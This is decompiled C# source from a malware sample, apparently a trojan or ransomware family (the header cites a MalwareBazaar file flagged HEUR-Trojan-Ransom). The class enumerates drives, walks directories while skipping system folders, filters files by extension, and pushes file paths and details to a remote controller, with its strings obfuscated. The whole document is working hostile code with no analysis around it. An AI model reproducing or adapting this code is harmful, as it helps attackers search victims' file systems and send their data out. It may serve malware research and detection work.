// Decompiled with JetBrains decompiler
// Type: wardhmrias.wardhmrias
// Assembly: wardhmrias, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 08CBA86B-489B-4E7A-8D19-875058370078
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-5dcb736bf556729b30654fe97da034c1ccd7471f7587cb82dc33f4aef2248b9c.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace wardhmrias
{
  internal class wardhmrias
  {
    public MLREDM iservder;
    public List<string> wardhmriasfdExts = new List<string>();
    public List<string> wardhmriasnotFilders = new List<string>();
    public string wardhmriasmaindPath;
    public int wardhmriassIndx = 0;
    public List<string> wardhmriassdFiles = new List<string>();
    public string wardhmriasfilesdLtogs = DLAONIF.wardhmriasfilesdLtogs;
    public int wardhmriasfIntdx = 0;
    public bool wardhmriasreagting = false;

    public string wardhmriaslookup_Drtives()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">|wardhmrias".Split('|')[0];
      }
      return str;
    }

    public bool wardhmriassee_Acdcess(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public wardhmrias()
    {
      this.wardhmriasnotFilders.Add("documents and settings|wardhmrias".Split('|')[0]);
      this.wardhmriasnotFilders.Add("program files|wardhmrias".Split('|')[0]);
      this.wardhmriasnotFilders.Add("system volume information|wardhmrias".Split('|')[0]);
      this.wardhmriasnotFilders.Add("windows|wardhmrias".Split('|')[0]);
      this.wardhmriasnotFilders.Add("program files (x86)|wardhmrias".Split('|')[0]);
      this.wardhmriasnotFilders.Add("programdata|wardhmrias".Split('|')[0]);
    }

    public IEnumerable<string> wardhmriasadd_Fifles(string path)
    {
      Queue<string> moreFiles = new Queue<string>();
      moreFiles.Enqueue(path);
      while (moreFiles.Count > 0 && !this.iservder.wardhmriasautCnls)
      {
        path = moreFiles.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.wardhmriassee_Acdcess(directory) && !this.wardhmriasnotFilders.Contains(directory.ToLower()))
              moreFiles.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public void wardhmriassendSesarch(string path)
    {
      try
      {
        foreach (string wardhmriasaddFifle in this.wardhmriasadd_Fifles(path))
        {
          if (this.wardhmriasfdExts.Contains(Path.GetExtension(wardhmriasaddFifle).ToLower()))
          {
            string str = this.iservder.wardhmriasfile_intfo(wardhmriasaddFifle, true);
            this.iservder.wardhmriaspush_dtata((byte[]) null, "wardhmrias-seaarf=|wardhmrias".Split('|')[0] + wardhmriasaddFifle + "<FIdLE_AUdTO<|wardhmrias".Split('|')[0] + str);
          }
          if (this.iservder.wardhmriasautCnls)
            break;
        }
      }
      catch
      {
      }
    }

    public string wardhmriaslookup_Fidles(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|wardhmrias".Split('|')[0];
      }
      else
        str = (string) null;
      return str;
    }

    public string wardhmriascheck_Foldrers(string path)
    {
      string str = "";
      if (!Directory.Exists(path))
        return (string) null;
      foreach (string directory in Directory.GetDirectories(path))
      {
        if (this.wardhmriassee_Acdcess(directory))
          str = str + directory + ">|wardhmrias".Split('|')[0];
      }
      return str;
    }

    public void wardhmriaslook_Fides(string tempStr)
    {
      this.iservder.wardhmriasautCnls = false;
      this.wardhmriasfdExts.Clear();
      this.wardhmriassdFiles.Clear();
      this.wardhmriasfIntdx = 0;
      this.wardhmriassIndx = 0;
      string[] strArray = tempStr.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.wardhmriasfdExts.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.wardhmriasreagting = true;
        this.wardhmriassendSesarch(strArray[1]);
        this.wardhmriasreagting = false;
        this.iservder.wardhmriaspush_dtata((byte[]) null, "wardhmrias-seaard=seahed|wardhmrias".Split('|')[0]);
      }
    }
  }
}
